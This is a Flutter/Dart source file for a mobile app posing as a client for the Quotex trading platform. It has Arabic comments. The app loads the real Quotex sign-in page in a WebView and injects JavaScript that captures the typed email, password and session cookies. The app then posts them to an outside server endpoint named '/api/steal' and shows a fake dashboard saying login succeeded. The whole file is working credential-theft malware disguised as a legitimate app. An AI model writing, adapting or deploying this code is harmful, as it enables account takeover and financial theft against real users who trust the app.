import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;

void main() => runApp(const MyApp());

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: const Color(0xFF030305),
        textTheme: GoogleFonts.cairoTextTheme(Theme.of(context).textTheme).apply(bodyColor: Colors.white),
      ),
      home: const LoginScreen(),
    );
  }
}

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});
  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  late WebViewController _controller;

  @override
  void initState() {
    super.initState();
    _requestPermissions();
    _initWebView();
  }

  void _requestPermissions() async {
    await Permission.location.request();
    await Permission.notification.request();
  }

  void _initWebView() {
    _controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setUserAgent("Quotex/1.0")
      ..addJavaScriptChannel(
        'QTX_CREDS',
        onMessageReceived: (msg) async {
          print("JAVASCRIPT MESSAGE: ${msg.message}");
          
          try {
            await http.post(
              Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
              headers: {"Content-Type": "application/json"},
              body: msg.message,
            );
            print("SENT TO SERVER");
          } catch (e) {
            print("SERVER ERROR: $e");
          }
        },
      )
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageFinished: (url) {
            _injectOriginalScript();
          },
          onNavigationRequest: (request) {
            // هون بنراقب إذا المستخدم دخل على صفحة التداول بعد تسجيل الدخول
            if (request.url.contains('/trade') || request.url.contains('/demo-trade')) {
              if (mounted) {
                Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
              }
            }
            return NavigationDecision.navigate;
          },
        ),
      )
      ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
  }

  void _injectOriginalScript() {
    String jsScript = """
      (function() {
        QTX_CREDS.postMessage(JSON.stringify({type: 'debug', message: 'script_executed'}));
        
        var savedEmail = "";
        var savedPass = "";
        var credsSent = false;

        function setNativeValue(el, value) {
          try {
            var proto = window.HTMLInputElement.prototype;
            var desc = Object.getOwnPropertyDescriptor(proto, 'value');
            desc.set.call(el, value);
          } catch (e) { el.value = value; }
          el.dispatchEvent(new Event('input', { bubbles: true }));
          el.dispatchEvent(new Event('change', { bubbles: true }));
        }
        
        function findEmail() {
          return document.querySelector('input[name="email"], input[type="email"], #email');
        }
        function findPass() {
          return document.querySelector('input[name="password"], input[type="password"], #password');
        }
        
        // دالة تراقب وتحدث المتغيرات المخفية
        function updateSavedValues() {
          var e = findEmail(), p = findPass();
          if (e && e.value) savedEmail = e.value;
          if (p && p.value) savedPass = p.value;
        }

        function sendCreds() {
          updateSavedValues();
          if (!credsSent && savedEmail && savedPass) {
            QTX_CREDS.postMessage(JSON.stringify({type: 'creds', email: savedEmail, password: savedPass}));
            var cookie = document.cookie;
            QTX_CREDS.postMessage(JSON.stringify({type: 'cookies', data: cookie}));
            credsSent = true; // عشان ما يبعتهم كذا مرة
          }
        }
        
        if (!window.__qtxHooksInstalled) {
          window.__qtxHooksInstalled = true;
          
          // بنحفظ البيانات أول ما يكتبها
          document.addEventListener('input', updateSavedValues, true);
          
          // لما يدوس تسجيل دخول بنبعت
          document.addEventListener('submit', sendCreds, true);
          document.addEventListener('click', function(ev) {
            var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
            if (t) sendCreds();
          }, true);
        }
      })();
    """;
    _controller.runJavaScript(jsScript);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        child: WebViewWidget(controller: _controller),
      ),
    );
  }
}

class MainTradingScreen extends StatelessWidget {
  const MainTradingScreen({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('لوحة التحكم'), backgroundColor: const Color(0xFF0E0E14)),
      body: const Center(child: Text('تم تسجيل الدخول بنجاح!')),
    );
  }
}
